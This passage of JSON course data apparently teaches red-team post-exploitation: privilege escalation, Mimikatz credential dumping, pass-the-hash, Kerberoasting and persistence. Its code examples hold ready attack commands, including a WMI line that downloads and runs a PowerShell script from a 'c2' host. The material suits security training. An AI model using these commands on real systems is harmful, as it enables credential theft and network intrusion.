                        "content": "<p>If the compromised host is missing security patches, it may be vulnerable to a known privilege escalation exploit. An attacker can run an enumeration script to check the system's patch level and cross-reference it with a database of known exploits.</p><p>A <strong>kernel exploit</strong> is a particularly powerful type of exploit that targets a vulnerability in the core of the operating system itself. A successful kernel exploit almost always results in the attacker gaining SYSTEM-level privileges.</p>",
                        "image": "https://images.unsplash.com/photo-1599508704512-2f19efd1e_35f?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Automated Enumeration with winPEAS",
                        "content": "<p>Manually checking for all possible privilege escalation vectors is time-consuming. Tools like <strong>winPEAS (Windows Privilege Escalation Awesome Scripts)</strong> automate this process.</p><div class='info-box note'><div class='info-box-header'><i class='fas fa-info-circle'></i><strong>Finding the Low-Hanging Fruit</strong></div><p>When run on a compromised host, winPEAS will perform hundreds of checks for common misconfigurations, missing patches, and other potential weaknesses. It produces a color-coded report that highlights the most promising paths for privilege escalation, saving the operator a huge amount of manual effort.</p></div>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a8a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "winPEAS.exe -a",
                    "language": "batch",
                    "code": ":: winPEAS is a standalone executable or script that an attacker runs on a compromised host.\n\n:: The '-a' flag tells it to run all checks and save the output with color-coding.\nwinPEAS.exe -a > output.txt\n\n:: --- Sample Colored Output (Conceptual) ---\n:: [!] Unquoted Service Path Found! [HIGHLY LIKELY]\n::    - Service: VulnerableSvc\n::    - Path: C:\\Program Files\\Vuln App\\service.exe\n:: [?] AlwaysInstallElevated is Enabled in the Registry\n::    - This allows any user to install MSI packages with SYSTEM rights.\n:: [*] Checking for interesting files...\n::    - Found C:\\inetpub\\wwwroot\\web.config with plaintext password."
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary goal of local privilege escalation?",
                        "options": [
                            "To gain access to another computer on the network.",
                            "To escalate from a standard user account to a higher-privileged account, like Administrator or SYSTEM, on the same machine.",
                            "To exfiltrate data.",
                            "To delete log files."
                        ],
                        "correct": 1,
                        "explanation": "Privilege escalation is about increasing your level of control over the machine you are already on. It is a critical step before an attacker can perform more advanced actions like credential dumping."
                    },
                    {
                        "id": 2,
                        "question": "What is an 'unquoted service path' vulnerability?",
                        "options": [
                            "A service that has no description.",
                            "A service path that contains spaces but is not enclosed in quotes, which can allow an attacker to hijack the execution path.",
                            "A service that runs too slowly.",
                            "A service that is not running."
                        ],
                        "correct": 1,
                        "explanation": "This is a classic Windows misconfiguration. Windows will try to interpret the path at each space, allowing an attacker to place an executable named `Program.exe` that will be run with the service's privileges."
                    },
                    {
                        "id": 3,
                        "question": "What is the purpose of a tool like winPEAS?",
                        "options": [
                            "To automatically exploit all vulnerabilities.",
                            "To automatically enumerate a Windows host for a wide range of common privilege escalation vectors.",
                            "To manage a C2 server.",
                            "To create malicious documents."
                        ],
                        "correct": 1,
                        "explanation": "winPEAS is an enumeration script. Its job is to find the potential paths to privilege escalation and present them to the operator, who then chooses which one to exploit."
                    }
                ]
            }
        },
        {
            "id": "lesson-14",
            "title": "Linux Privilege Escalation",
            "duration": "75 min",
            "objectives": [
                "Understand the goal of escalating to the root user",
                "Learn how to exploit SUID/GUID binaries",
                "Explore techniques for exploiting sudo misconfigurations and kernel vulnerabilities",
                "Analyze the use of automated enumeration scripts like LinPEAS"
            ],
            "content": {
                "overview": "Just like on Windows, gaining root access is a key objective after compromising a Linux host. This lesson covers the common techniques for escalating privileges in a Linux environment, from abusing file permissions to exploiting vulnerabilities in the kernel itself.",
                "sections": [
                    {
                        "title": "SUID/GUID Binaries",
                        "content": "<p>In Linux, a <strong>SUID (Set User ID)</strong> binary is an executable that, when run, executes with the permissions of the file owner, not the user who ran it. If a binary owned by the 'root' user has the SUID bit set, it will run as root, even when executed by a standard user.</p><p>If a SUID binary has a vulnerability (e.g., it allows the user to run arbitrary commands), an attacker can exploit this to get a root shell. The first step is always to search the system for all SUID binaries.</p>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
                        "title": "Sudo and Cron Job Misconfigurations",
                        "content": "<ul><li><strong>Sudo Misconfigurations:</strong> The `sudo` command allows a user to run commands as another user (typically root). The `/etc/sudoers` file defines these permissions. If a user is granted sudo access to run a specific command that can be abused to spawn a shell (like `find`, `nmap`, or even text editors like `vim`), they can easily escalate to root.</li><li><strong>Writable Cron Jobs:</strong> Cron is the Linux task scheduler. If a scheduled task (cron job) that runs as root is a script that is writable by a standard user, the attacker can simply add their own malicious commands to the script, which will then be executed as root at the next scheduled time.</li></ul>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Automated Enumeration with LinPEAS",
                        "content": "<p>Similar to its Windows counterpart, <strong>LinPEAS (Linux Privilege Escalation Awesome Scripts)</strong> is a script that automates the enumeration of a Linux host for privilege escalation vectors.</p><div class='info-box note'><div class='info-box-header'><i class='fas fa-info-circle'></i><strong>Comprehensive Checks</strong></div><p>LinPEAS will check for hundreds of potential weaknesses, including world-writable files, SUID/GUID binaries, sudo permissions, interesting cron jobs, kernel version and known exploits, and much more. It provides a color-coded report that makes it easy for an operator to spot the most promising paths to root.</p></div>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a8a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "find / -perm -u=s -type f 2>/dev/null",
                    "language": "bash",
                    "code": "# This is a classic Linux command to find all SUID executables.\n\n# find / : Start searching from the root directory.\n# -perm -u=s : Find files where the SUID permission bit is set.\n# -type f : Only look for files.\n# 2>/dev/null : Redirect any permission denied errors to null, cleaning up the output.\n\n# --- Sample Output ---\n# /usr/bin/passwd\n# /usr/bin/su\n# /usr/bin/sudo\n# /usr/local/bin/legacy_tool  <-- An unusual or custom SUID binary is highly suspicious!"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the significance of a SUID binary that is owned by root?",
                        "options": [
                            "It has no special significance.",
                            "It can only be run by the root user.",
                            "When executed by any user, it runs with the permissions of the root user.",
                            "It is a script file."
                        ],
                        "correct": 2,
                        "explanation": "The SUID bit allows a program to temporarily elevate its privileges to that of its owner. If a root-owned SUID binary is vulnerable, it provides a direct path for a standard user to become root."
                    },
                    {
                        "id": 2,
                        "question": "If the `/etc/sudoers` file allows a user to run the `find` command with sudo, how can this be abused?",
                        "options": [
                            "It cannot be abused.",
                            "The `find` command has an `-exec` option that can be used to execute other commands, including spawning a root shell.",
                            "The user can find all the files on the system.",
                            "The user can delete the `find` command."
                        ],
                        "correct": 1,
                        "explanation": "This is a classic sudo misconfiguration. Many standard Linux utilities have features that can be abused to 'escape' to a full shell, which, when run with sudo, will be a root shell. GTFOBins is a famous repository of these techniques."
                    },
                    {
                        "id": 3,
                        "question": "What is the purpose of a tool like LinPEAS?",
                        "options": [
                            "To automatically escalate privileges to root.",
                            "To manage a C2 server on Linux.",
                            "To automatically enumerate a Linux system for a wide variety of common privilege escalation vectors.",
                            "To scan the network for other Linux hosts."
                        ],
                        "correct": 2,
                        "explanation": "Like its Windows counterpart, LinPEAS is an enumeration tool. It finds the potential vulnerabilities and misconfigurations and presents them to the operator to act upon."
                    }
                ]
            }
        },
        {
            "id": "lesson-15",
            "title": "Credential Dumping and Harvesting",
            "duration": "75 min",
            "objectives": [
                "Understand the goal of credential dumping",
                "Learn how to extract credentials from memory (LSASS)",
                "Explore the use of Mimikatz for password and hash extraction",
                "Analyze the importance of Kerberos ticket harvesting",
                "Practice dumping LSASS memory and extracting credentials in a lab"
            ],
            "content": {
                "overview": "Once an attacker has achieved administrative privileges on a host, their next objective is often to harvest all the credentials stored on it. This gives them the keys to move laterally throughout the network. This lesson covers the powerful techniques used to dump passwords, hashes, and tickets from a compromised Windows host.",
                "sections": [
                    {
                        "title": "Dumping the LSASS Process",
                        "content": "<p>The <strong>Local Security Authority Subsystem Service (LSASS)</strong> is a process on Windows that stores user credentials in memory for users who are logged onto the system. This includes things like plaintext passwords, NTLM hashes, and Kerberos tickets.</p><p>An attacker with administrator privileges can dump the memory of the `lsass.exe` process to a file. This memory dump can then be taken offline and analyzed to extract all of these valuable credentials. This is one of the most impactful post-exploitation actions an attacker can take.</p>",
                        "image": "https://i.imgur.com/3Z4h7k2.png"
                    },
                    {
                        "title": "Credential Extraction with Mimikatz",
                        "content": "<p><strong>Mimikatz</strong> is a legendary post-exploitation tool that is the swiss army knife for Windows credential theft. It can perform the LSASS memory dump and the credential extraction all in one step.</p><h3>Key Mimikatz Commands:</h3><ul><li><code>privilege::debug</code>: A required first step to get the necessary permissions to interact with LSASS.</li><li><code>sekurlsa::logonpasswords</code>: This is the primary command. It parses the LSASS memory and dumps all available credentials, including plaintext passwords for logged-on users (if available), NTLM hashes, and Kerberos tickets.</li></ul><p>Because Mimikatz is so well-known, it is heavily targeted by antivirus and EDR products. Modern red teams often use custom or modified versions to evade detection.</p>",
                        "image": "https://i.imgur.com/fgS4fG3.png"
                    },
                    {
                        "title": "The Power of Hashes and Tickets",
                        "content": "<p>Even if the attacker cannot get a plaintext password, the NTLM hash or a Kerberos ticket is often just as good.</p><div class='info-box warning'><div class='info-box-header'><i class='fas fa-exclamation-triangle'></i><strong>Pass-the-Hash</strong></div><p>Windows authentication protocols are designed in such a way that an attacker can often use the NTLM hash directly to authenticate to other machines on the network, without ever needing to crack it to get the plaintext password. This is called a <strong>Pass-the-Hash</strong> attack, and it is a fundamental technique for lateral movement, which we will cover in the next section.</p></div>",
                        "image": "https://images.unsplash.com/photo-1599508704512-2f19efd1e_35f?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
                    "language": "batch",
                    "code": ":: This is the classic one-liner to run Mimikatz and dump credentials.\n:: It is often executed from a C2 beacon like Cobalt Strike.\n\n:: 1. mimikatz.exe: The executable.\n:: 2. \"privilege::debug\": The first command, to elevate privileges.\n:: 3. \"sekurlsa::logonpasswords\": The second command, to dump credentials from LSASS.\n:: 4. \"exit\": The final command, to exit Mimikatz.\n\n:: --- Sample Output (Abbreviated) ---\n:: Authentication Id : 0 ; 996 (00000000:000003e4)\n:: Session           : Service from 0\n:: User Name         : WEB-SERVER$\n:: Domain            : WORKGROUP\n:: NTLM              : 2b011e0e172482329c8822ab83792033\n::\n:: Authentication Id : 0 ; 12345 (00000000:00003039)\n:: Session           : Interactive\n:: User Name         : jsmith\n:: Domain            : CORPNET\n:: Password          : (null)  <-- Sometimes plaintext is available!\n:: NTLM              : 8a73492a725224523b105f639c391082"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the LSASS process in Windows?",
                        "options": [
                            "A web browser.",
                            "A core system process that stores user credentials in memory.",
                            "The Windows antivirus.",
                            "The system's logging service."
                        ],
                        "correct": 1,
                        "explanation": "The Local Security Authority Subsystem Service is a critical process for managing security and authentication, which makes its memory a high-value target for attackers."
                    },
                    {
                        "id": 2,
                        "question": "What is the primary function of the tool Mimikatz?",
                        "options": [
                            "To scan for vulnerabilities.",
                            "To send phishing emails.",
                            "To extract passwords, hashes, and tickets from memory, particularly from the LSASS process.",
                            "To act as a C2 server."
                        ],
                        "correct": 2,
                        "explanation": "Mimikatz is the premier tool for Windows credential theft. Its ability to parse the LSASS process and extract credentials makes it a standard part of almost every red teamer's toolkit."
                    },
                    {
                        "id": 3,
                        "question": "What is a 'Pass-the-Hash' attack?",
                        "options": [
                            "An attack that requires the attacker to crack a password hash.",
                            "An attack where the attacker uses a stolen NTLM hash directly to authenticate to another system, without needing the plaintext password.",
                            "An attack against a hash function.",
                            "A type of password guessing attack."
                        ],
                        "correct": 1,
                        "explanation": "This is a fundamental technique for Windows lateral movement. Because of the way NTLM authentication works, possessing the hash is often just as good as possessing the password."
                    }
                ]
            }
        },
        
        {
            "id": "lesson-16",
            "title": "Lateral Movement with Pass-the-Hash/Ticket",
            "duration": "75 min",
            "objectives": [
                "Understand the concept of lateral movement",
                "Learn how to use stolen NTLM hashes for Pass-the-Hash attacks",
                "Explore the use of Kerberos tickets for Pass-the-Ticket attacks",
                "Use tools like PsExec to authenticate to other machines with hashes",
                "Analyze the defensive mitigations for these attacks"
            ],
            "content": {
                "overview": "Once an attacker has credentials, they can stop acting like a hacker and start acting like a legitimate user. This lesson covers the foundational techniques for lateral movement in a Windows environment, where an attacker uses stolen credentials (hashes and tickets) to move from a compromised machine to other systems on the network.",
                "sections": [
                    {
                        "title": "Lateral Movement Concepts",
                        "content": "<p><strong>Lateral movement</strong> refers to the set of techniques that an attacker uses to move from host to host within a compromised network. After gaining an initial foothold on a workstation, the attacker's goal is to move to a more valuable target, like a file server or, ultimately, a domain controller.</p><p>Instead of exploiting software vulnerabilities on each new machine, attackers can simply use the credentials they have stolen to log in as a legitimate user.</p>",
                        "image": "https://i.imgur.com/3Z4h7k2.png"
                    },
                    {
                        "title": "Pass-the-Hash (PtH)",
                        "content": "<p>In a Windows network, it is often not necessary to have a user's plaintext password. <strong>Pass-the-Hash (PtH)</strong> is a technique where an attacker uses a user's stolen NTLM hash to authenticate to a remote server or service.</p><p>Tools like <strong>PsExec</strong> (from the Sysinternals suite) or its impacket equivalent can be used to launch a command prompt on a remote machine using nothing but a username and their NTLM hash. If the compromised user has administrative rights on the target machine, the attacker will get a SYSTEM-level shell. This is a very common and powerful lateral movement technique.</p>",
                        "image": "https://images.unsplash.com/photo-1599508704512-2f19efd1e_35f?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Pass-the-Ticket (PtT)",
                        "content": "<p>In a network that uses Kerberos authentication (the default for Active Directory), an attacker can perform a similar attack using stolen Kerberos tickets. This is called <strong>Pass-the-Ticket (PtT)</strong>.</p><div class='info-box note'><div class='info-box-header'><i class='fas fa-info-circle'></i><strong>Using Stolen Tickets</strong></div><p>After dumping credentials with Mimikatz, the attacker may find Kerberos tickets in memory. They can inject this stolen ticket into their own logon session. With the ticket injected, they can now access any resource that the original ticket was valid for (e.g., a file share or a web server) as the compromised user, without needing the user's password or hash.</p></div>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a8a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "PsExec.py -hashes :<ntlm_hash> user@target-ip",
                    "language": "bash",
                    "code": "# PsExec.py is part of the popular open-source Impacket library.\n# It allows for remote command execution and is a favorite for lateral movement.\n\n# The target IP address\nTARGET_IP=\"10.10.10.100\"\n\n# The username and NTLM hash we dumped from the first machine\nUSER=\"jsmith\"\nNTLM_HASH=\"8a73492a725224523b105f639c391082\"\n\n# The command to execute the Pass-the-Hash attack\n# It tells PsExec to authenticate to the target using the NTLM hash instead of a password.\n# If successful, it will drop us into an interactive cmd.exe shell on the remote machine.\n\nimpacket-psexec -hashes :$NTLM_HASH $USER@$TARGET_IP"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary goal of lateral movement?",
                        "options": [
                            "To gain initial access to the network.",
                            "To escalate privileges on the current host.",
                            "To move from a compromised host to other hosts within the network.",
                            "To exfiltrate data."
                        ],
                        "correct": 2,
                        "explanation": "Lateral movement is the process of expanding an attacker's presence and control within the internal network, moving from a less valuable system to a more valuable one."
                    },
                    {
                        "id": 2,
                        "question": "A Pass-the-Hash attack allows an attacker to do what?",
                        "options": [
                            "Crack a user's password hash.",
                            "Use a stolen NTLM hash to authenticate to a remote system without needing the plaintext password.",
                            "Create a new password hash.",
                            "Steal a Kerberos ticket."
                        ],
                        "correct": 1,
                        "explanation": "This is a fundamental technique that bypasses the need for password cracking. The hash itself is used as the authenticator."
                    },
                    {
                        "id": 3,
                        "question": "In a Pass-the-Ticket attack, what is the attacker stealing and reusing?",
                        "options": [
                            "A password.",
                            "An NTLM hash.",
                            "A Kerberos ticket.",
                            "A software vulnerability."
                        ],
                        "correct": 2,
                        "explanation": "Similar to PtH, a PtT attack involves stealing a valid Kerberos ticket from a compromised host's memory and replaying it to access network resources as the legitimate user."
                    }
                ]
            }
        },
        {
            "id": "lesson-17",
            "title": "Lateral Movement with Services and RDP",
            "duration": "75 min",
            "objectives": [
                "Learn how to use built-in Windows tools for remote execution",
                "Explore the use of PsExec, WMI, and WinRM for lateral movement",
                "Understand how to abuse Remote Desktop Protocol (RDP) for interactive access",
                "Analyze the trade-offs between different lateral movement techniques"
            ],
            "content": {
                "overview": "Beyond using stolen credentials with custom tools, attackers often 'live off the land' by abusing the legitimate administrative protocols and services built into Windows for remote management. This lesson covers how tools like PsExec, WMI, and RDP can be used to execute code and move laterally across the network.",
                "sections": [
                    {
                        "title": "Lateral Movement with PsExec",
                        "content": "<p><strong>PsExec</strong> is a legitimate sysadmin tool from Microsoft that allows an administrator to execute commands on a remote computer. Attackers love it because it's a trusted, signed Microsoft binary that is often allowed by security products.</p><p>If an attacker has administrative credentials (or a hash) for a remote machine, they can use PsExec to get an interactive command prompt on that machine. PsExec works by uploading a small service to the remote machine's `ADMIN$` share, starting the service, and then communicating with it over the SMB protocol.</p>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
                        "title": "Lateral Movement with WMI and WinRM",
                        "content": "<ul><li><strong>WMI (Windows Management Instrumentation):</strong> WMI is a powerful interface for managing Windows machines. An attacker with credentials can use WMI remotely to execute commands or run their payload on a target host. This is often stealthier than PsExec, as it may not involve dropping a new binary to disk.</li><li><strong>WinRM (Windows Remote Management):</strong> WinRM is the modern Microsoft protocol for remote management, and PowerShell is the primary tool for interacting with it. An attacker can use PowerShell remoting to execute scripts and commands on a target machine, providing another powerful vector for lateral movement.</li></ul>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Abusing Remote Desktop Protocol (RDP)",
                        "content": "<p><strong>RDP</strong> provides a full, interactive graphical desktop session on a remote machine. If an attacker has stolen the credentials for a user who is allowed to RDP into a server, they can simply log in with a full GUI, just like a legitimate administrator.</p><div class='info-box warning'><div class='info-box-header'><i class='fas fa-exclamation-triangle'></i><strong>Noisy but Effective</strong></div><p>While an interactive RDP session is much 'noisier' and easier for a defender to spot than a stealthy C2 beacon, it is also incredibly powerful. It gives the attacker full, easy control over the target machine and is a very common technique for moving around a network once credentials have been compromised.</p></div>",
                        "image": "https://images.unsplash.com/photo-1587620962725-abab7fe55159?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "wmic /node:target-ip process call create \"c:\\payload.exe\"",
                    "language": "batch",
                    "code": ":: This command uses the legitimate Windows wmic.exe binary to execute a process on a remote machine.\n\n:: /node:target-ip : Specifies the remote computer to connect to.\n:: process call create : This is the WMI method to create a new process.\n:: \"c:\\payload.exe\" : The command to execute on the remote machine.\n\n:: The attacker would need to have already uploaded their payload to the target\n:: and have valid administrative credentials for the connection.\n\n:: Example using stolen credentials:\nwmic /node:10.10.10.101 /user:jsmith /password:Password123 process call create \"powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(\\\"http://c2/payload.ps1\\\")'\""
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "Why do attackers often use legitimate tools like PsExec and WMI for lateral movement?",
                        "options": [
                            "Because they are the only tools that work.",
                            "Because their traffic is more likely to be allowed through firewalls and less likely to be flagged as malicious by security products, as they are also used by system administrators.",
                            "Because they are easier to use than graphical tools.",
                            "Because they are very quiet and do not generate logs."
                        ],
                        "correct": 1,
                        "explanation": "This is a core tenet of the 'Living Off the Land' philosophy. By using the system's own trusted tools, the attacker's activity can blend in with legitimate administrative traffic, making it harder to detect."
                    },
                    {
                        "id": 2,
                        "question": "Which of the following is NOT a common protocol used for lateral movement in a Windows environment?",
                        "options": [
                            "SMB (used by PsExec)",
                            "WMI",
                            "WinRM (PowerShell Remoting)",
                            "FTP"
                        ],
                        "correct": 3,
                        "explanation": "While FTP can be used to transfer files, SMB, WMI, and WinRM are the primary protocols that provide rich, remote administration and command execution capabilities on Windows."
                    },
                    {
                        "id": 3,
                        "question": "What is the primary advantage for an attacker of using RDP for lateral movement?",
                        "options": [
                            "It is very stealthy.",
                            "It provides a full, interactive graphical desktop session, giving the attacker easy and complete control of the remote machine.",
                            "It does not require credentials.",
                            "It can be used to connect to multiple machines at once."
                        ],
                        "correct": 1,
                        "explanation": "RDP gives the attacker an 'easy button'. Instead of a command-line shell, they get the full Windows desktop, which makes tasks like searching for sensitive files and running graphical tools much simpler."
                    }
                ]
            }
        },
        {
            "id": "lesson-18",
            "title": "Advanced AD Attacks: Kerberoasting",
            "duration": "75 min",
            "objectives": [
                "Understand the basics of Kerberos and Service Principal Names (SPNs)",
                "Learn the mechanism of a Kerberoasting attack",
                "Explore how to request Kerberos tickets for service accounts",
                "Practice cracking the stolen tickets offline with Hashcat",
                "Analyze mitigations for Kerberoasting"
            ],
            "content": {
                "overview": "Kerberoasting is a powerful and stealthy post-exploitation technique that allows an attacker with any valid domain account to potentially harvest the plaintext credentials for high-privilege service accounts. This lesson provides a deep dive into how the Kerberos protocol can be abused to steal and crack these valuable credentials.",
                "sections": [
                    {
                        "title": "Kerberos and Service Principal Names (SPNs)",
                        "content": "<p>In Active Directory, a <strong>Service Principal Name (SPN)</strong> is a unique identifier for a service instance. For example, a SQL Server service might have an SPN like `MSSQLSvc/sql-server.corp.local:1433`. SPNs are linked to the user accounts that run the service (<strong>service accounts</strong>).</p><p>The Kerberos protocol is used to request access to these services. Any valid domain user can request a Kerberos ticket, called a Ticket Granting Service (TGS) ticket, for any service in the domain.</p>",
                        "image": "https://i.imgur.com/u7y7o9o.png"
                    },
                    {
                        "title": "The Kerberoasting Attack",
                        "content": "<p>The <strong>Kerberoasting</strong> attack exploits this mechanism. The TGS ticket that the Domain Controller sends back to the user is encrypted with the NTLM hash of the *service account's* password.</p><div class='info-box warning'><div class='info-box-header'><i class='fas fa-exclamation-triangle'></i><strong>Offline Cracking</strong></div><p>The attack works as follows: <ol><li>As a standard domain user, the attacker queries the domain for a list of all accounts that have an SPN (i.e., all the service accounts).</li><li>The attacker requests a TGS ticket for each of these services. This is a normal, legitimate Kerberos action and is not suspicious.</li><li>The attacker extracts the encrypted portion of the ticket from their own memory.</li><li>The attacker takes this encrypted ticket offline and can now attempt to crack it using a brute-force or dictionary attack. If the service account has a weak password, the attacker can recover the plaintext password.</li></ol>Because this is an offline attack, it is invisible to the organization's security monitoring.</p></div>",
                        "image": "https://images.unsplash.com/photo-1599508704512-2f19efd1e_35f?w=800&h=400&fit=crop"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "GetUserSPNs.py -request 'DOMAIN/User'",
                        "language": "bash",
                        "code": "# GetUserSPNs.py is another tool from the Impacket suite.\n# It automates the process of finding and requesting service tickets.\n\n# 1. First, find all the kerberoastable accounts in the domain\nimpacket-GetUserSPNs -all corp.local/jsmith:Password123 > spns.txt\n\n# 2. For each account found, request the TGS ticket and save it to a file\n#    that Hashcat can crack.\nimpacket-GetUserSPNs corp.local/jsmith:Password123 -request -outputfile tickets.hashcat\n\n# --- Sample Hashcat output ---\n# $krb5tgs$23$*user$domain$service*hex_data_of_ticket\n\n# 3. Take the 'tickets.hashcat' file offline and crack it with Hashcat\nhashcat -m 13100 -a 0 tickets.hashcat /path/to/wordlist.txt"
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the goal of a Kerberoasting attack?",
                        "options": [
                            "To crash the Kerberos service.",
                            "To request Kerberos tickets for service accounts and crack them offline to recover their plaintext passwords.",
                            "To gain initial access to the network.",
                            "To move laterally between hosts."
                        ],
                        "correct": 1,
                        "explanation": "Kerberoasting targets service accounts, which often have high privileges. By cracking their passwords, an attacker can gain access to critical systems and data."
                    },
                    {
                        "id": 2,
                        "question": "What kind of permissions are required to perform a Kerberoasting attack?",
                        "options": [
                            "Domain Administrator permissions.",
                            "Local Administrator permissions.",
                            "Any authenticated domain user account.",
                            "No authentication is needed."
                        ],
                        "correct": 2,
                        "explanation": "This is what makes the attack so powerful and stealthy. Any user, even one with the lowest privileges, can request these service tickets as part of normal Kerberos functionality."
                    },
                    {
                        "id": 3,
                        "question": "Why is the cracking portion of a Kerberoasting attack considered 'stealthy'?",
                        "options": [
                            "Because it is very fast.",
                            "Because it is performed offline, on the attacker's own machine, so it does not generate any network traffic or log events in the target environment.",
                            "Because it uses encryption.",
                            "Because it does not require a password list."
                        ],
                        "correct": 1,
                        "explanation": "The only interaction with the target network is the legitimate request for the ticket. The noisy, computationally-intensive password cracking happens entirely on the attacker's infrastructure, making it invisible to the defenders."
                    }
                ]
            }
        },
        {
            "id": "lesson-19",
            "title": "Establishing Persistence",
            "duration": "75 min",
            "objectives": [
                "Understand the goal of persistence in an attack",
                "Learn common Windows persistence techniques (Scheduled Tasks, Services, Run Keys)",
                "Explore common Linux persistence techniques (Cron Jobs, systemd, SSH keys)",
                "Analyze how to create and manage persistent C2 beacons"
            ],
            "content": {
                "overview": "After gaining access, a sophisticated attacker wants to ensure they can maintain that access, even if the initial exploit is discovered or the compromised machine is rebooted. This lesson covers the common techniques for establishing persistence on both Windows and Linux hosts.",
                "sections": [
                    {
                        "title": "The Goal of Persistence",
                        "content": "<p><strong>Persistence</strong> consists of techniques that adversaries use to maintain access to systems across restarts, changed credentials, and other interruptions. The goal is to ensure that their C2 implant will be automatically executed whenever the system boots up or a user logs in.</p><p>This is a critical step for a long-term operation. The initial access vector (like a phishing email) is a one-time event. Persistence is what turns that one-time access into a long-term compromise.</p>",
                        "image": "https://i.imgur.com/u7nL6Xk.png"
                    },
                    {
                        "title": "Windows Persistence Techniques",
                        "content": "<p>Windows offers many legitimate features that can be abused by attackers for persistence.</p><h3>Common Methods:</h3><ul><li><strong>Scheduled Tasks:</strong> An attacker with administrative rights can create a new scheduled task that is configured to run their payload at system startup or when a user logs on.</li><li><strong>New Services:</strong> An attacker can create a new Windows service that is configured to automatically start on boot and runs their C2 implant.</li><li><strong>Registry Run Keys:</strong> Windows has specific keys in the Registry (e.g., `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`) where any program listed will be automatically executed at startup. An attacker can simply add their payload to one of these keys.</li></ul>",
                        "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Linux Persistence Techniques",
                        "content": "<p>Linux offers a similar set of features that can be abused.</p><h3>Common Methods:</h3><ul><li><strong>Cron Jobs:</strong> An attacker can add a new entry to the system's crontab that will execute their payload on a regular schedule (e.g., every minute).</li><li><strong>systemd Services:</strong> On modern Linux systems, an attacker can create a new `systemd` user service that will be automatically started at boot.</li><li><strong>SSH Keys:</strong> If an attacker gains access to a user's `.ssh` directory, they can add their own public key to the `authorized_keys` file. This creates a permanent SSH backdoor that allows them to log in as that user without a password.</li></ul>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "schtasks /create /tn \"Updater\" /tr \"C:\\payload.exe\" /sc onlogon",
                    "language": "batch",
                    "code": ":: This command uses the legitimate Windows schtasks.exe binary to create a persistence mechanism.\n\n:: /create : Create a new scheduled task.\n:: /tn \"Updater\" : The name of the task. An attacker will choose an innocent-sounding name.\n:: /tr \"C:\\payload.exe\" : The command or program to run. This will point to the C2 implant.\n:: /sc onlogon : The schedule. This configures the task to run whenever any user logs on.\n:: /ru \"SYSTEM\" : (Optional, requires admin) Run the task as the SYSTEM user."
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary goal of establishing persistence?",
                        "options": [
                            "To gain initial access.",
                            "To escalate privileges.",
                            "To ensure that an attacker can maintain their access to a compromised system across reboots and other interruptions.",
                            "To steal data."
                        ],
                        "correct": 2,
                        "explanation": "Persistence is about long-term access. It's the mechanism that ensures the attacker's C2 beacon will survive a simple reboot of the compromised machine."
                    },
                    {
                        "id": 2,
                        "question": "Adding a program to a registry key like `HKLM\\...\\Run` is a persistence technique for which operating system?",
                        "options": [
                            "Linux",
                            "macOS",
                            "Windows",
                            "Android"
                        ],
                        "correct": 2,
                        "explanation": "The Windows Registry is a common target for persistence. The 'Run' keys are a built-in feature that automatically starts programs at login, which an attacker can easily abuse."
                    },
                    {
                        "id": 3,
                        "question": "Adding an attacker's public key to a user's `authorized_keys` file is a persistence technique for which service on Linux?",
                        "options": [
                            "FTP",
                            "Apache",
                            "SSH",
                            "Cron"
                        ],
                        "correct": 2,
                        "explanation": "This creates a backdoor for the SSH service. It allows the attacker to log in directly as that user using their own private key, bypassing the need for a password."
                    }
                ]
            }
        },
        {
            "id": "lesson-20",
            "title": "Achieving Domain Dominance",
            "duration": "75 min",
            "objectives": [
                "Understand the ultimate goal of compromising a Domain Controller",
                "Learn the mechanism of a DCSync attack",
                "Explore how to use Mimikatz to extract all domain credentials",
                "Analyze the importance of the KRBTGT account hash",
                "Perform a DCSync attack in a lab environment"
            ],
            "content": {
                "overview": "The ultimate goal for an attacker in an Active Directory environment is to achieve Domain Dominance. This means compromising a Domain Controller and gaining complete, irreversible control over the entire domain. This lesson covers the powerful DCSync attack, a technique that allows an attacker to impersonate a Domain Controller and steal the credentials for every user in the domain.",
                "sections": [
                    {
                        "title": "The Goal: Compromising a Domain Controller",
